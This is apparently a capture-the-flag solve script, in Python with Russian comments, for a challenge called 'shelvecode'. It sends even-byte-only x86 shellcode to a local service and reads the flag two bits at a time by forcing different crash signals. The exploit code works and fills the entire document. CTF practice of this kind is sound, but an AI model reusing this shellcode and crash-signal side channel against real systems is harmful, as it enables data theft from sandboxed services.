#!/usr/bin/env python3
"""Эксплойт для shelvecode: оракул по сигналам (только чётные байты shellcode)
восстанавливает флаг из arena.flag побайтово.

Запуск:  python3 solve.py [host] [port]   (по умолчанию 127.0.0.1 13442)
"""

import argparse
import socket
import struct
import sys

OUTCOME_BITS = {
    "SIGSEGV": 0,
    "SIGFPE": 1,
    "SIGILL": 2,
    "SIGALRM": 3,
}


def receive_until(sock, marker):
    data = bytearray()
    while not data.endswith(marker):
        chunk = sock.recv(1)
        if not chunk:
            raise RuntimeError("connection closed before prompt")
        data.extend(chunk)
    return bytes(data)


def receive_all(sock):
    data = bytearray()
    while True:
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            break
        if not chunk:
            break
        data.extend(chunk)
    return bytes(data)


def query(host, port, payload):
    if len(payload) > 64 or any(value & 1 for value in payload):
        raise RuntimeError("invalid even-byte payload")
    with socket.create_connection((host, port), timeout=2) as sock:
        sock.settimeout(2)
        receive_until(sock, b"length> ")
        sock.sendall(f"{len(payload)}\n".encode())
        receive_until(sock, b"hex> ")
        sock.sendall(payload.hex().encode() + b"\n")
        response = receive_all(sock).decode("ascii", "replace").strip()
    return response


def payload_for(index, pair):
    prefix = b"\x90" if index & 1 else b""
    displacement = 0x1000 + index - len(prefix)
    if displacement < 0 or displacement > 0xffffffff:
        raise RuntimeError("flag displacement does not fit")
    code = bytearray(prefix)
    code += b"\xe8\x00\x00\x00\x00"
    code += b"\x5e\x8a\x86" + struct.pack("<I", displacement)
    first_mask = 1 << (pair * 2)
    second_mask = first_mask << 1
    if first_mask == 1:
        code += b"\xb2\x00\xfe\xc2"
    else:
        code += bytes([0xb2, first_mask])
    code += b"\x84\xd0\x74\x0c"
    code += bytes([0xf6, 0xc0, second_mask])
    code += b"\x74\x02\xe2\xfe"
    code += b"\xb0\x00\xf6\xf0"
    code += b"\x90\x90"
    code += bytes([0xf6, 0xc0, second_mask])
    code += b"\x74\x04"
    code += b"\x62\x00\x00\x00\xf4"
    if len(code) > 64:
        raise RuntimeError("payload is too long")
    return bytes(code)


def read_flag(host, port):
    result = bytearray()
    for index in range(64):
        value = 0
        for pair in range(4):
            outcome = query(host, port, payload_for(index, pair))
            if outcome not in OUTCOME_BITS:
                raise RuntimeError(f"unexpected monitor response: {outcome!r}")
            value |= OUTCOME_BITS[outcome] << (pair * 2)
        result.append(value)
        text = result.decode("ascii", "replace")
        print(f"\r{index + 1:02d} bytes: {text}", end="", flush=True)
        if value == ord("}"):
            print()
            return text
    print()
    raise RuntimeError("closing brace was not found")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("host", nargs="?", default="127.0.0.1")
    parser.add_argument("port", type=int, nargs="?", default=13442)
    args = parser.parse_args()
    flag = read_flag(args.host, args.port)
    if not flag.lower().startswith("innoctf{"):
        raise RuntimeError(f"unexpected flag: {flag!r}")
    print(flag)


if __name__ == "__main__":
    try:
        main()
    except (OSError, RuntimeError) as error:
        print(f"error: {error}", file=sys.stderr)
        raise SystemExit(1)
